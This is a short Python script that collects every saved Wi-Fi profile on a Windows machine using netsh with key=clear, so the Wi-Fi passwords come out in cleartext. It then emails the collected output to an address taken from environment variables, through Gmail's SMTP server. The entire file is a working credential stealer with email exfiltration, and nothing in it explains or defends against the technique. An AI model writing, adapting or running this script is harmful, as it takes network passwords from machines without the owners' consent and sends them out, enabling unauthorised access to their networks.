import subprocess
import smtplib
import re

import os
from dotenv import load_dotenv
load_dotenv()

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()
    
command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode()

networkNames = re.findall(r"(?:Profile\s*:\s)(.*)", networks)

results = ""

for net in networkNames:
    command = f"netsh wlan show profile \"{net}\" key=clear"
    results += subprocess.check_output(command, shell=True).decode() + "\n"

send_mail(os.getenv("EMAIL"), os.getenv("APP_PASSWORD"), results)